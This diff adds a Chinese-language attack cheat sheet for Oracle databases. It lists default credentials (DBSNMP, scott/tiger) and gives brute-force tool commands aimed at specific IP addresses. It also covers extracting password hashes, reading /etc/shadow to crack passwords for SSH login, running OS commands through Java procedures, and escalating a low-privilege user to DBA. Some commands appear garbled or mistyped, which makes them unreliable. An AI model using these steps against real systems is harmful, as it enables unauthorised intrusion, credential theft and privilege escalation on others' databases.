@@ -1,0 +1,46 @@
+1.oracle的端口默认是1521  
+
+默认密码 DBSNMP
+
+2.oracle数据库口令扫描工具
+
+a.Python脚本的oracle.pl
+b.GUI界面的GOSS
+c.Oracle字符集扫描工具
+d.tnscmd.pl 需要perl支持
+
+3.oracle客服端连接  使用默认用户SCOTT
+sqlplus scott/tiger@//ip:1521/ose
+
+#@/linux.sql
+exec:javaeadfileproc('/etc/shadow')
+得到密码16位的  MD5解密   ssh登录
+
+
+oracle密码暴力破解工具
+orabrute 1.1
+使用方法：orabrute.exe 125.47.26.56 1521 sid内容 1000
+oracle_checkpwd 提取密码散列值
+使用方法：checkpwd sys/123456@//172.55.44.65:1521/sid内容 password.list 远程破解
+
+本地破解：格式：checkpwd system::fghghtgtthj password.list
+
+java提权
+
+先准备java.sql下载回来
+
+登录
+
+执行 @java.sql
+自动获得权限
+执行命令
+exec :x:=run_cmz('ipconfig /all');
+
+低权限提升高权限
+用户角色 scott低权限
+
+给予他DBA权限
+给予scott DBA权限的命令
+执行 EXEC DBMS_scheduler。run_job（'extjobexec'）;
+
+暗战与亮剑 里面4.21有直接shell代码
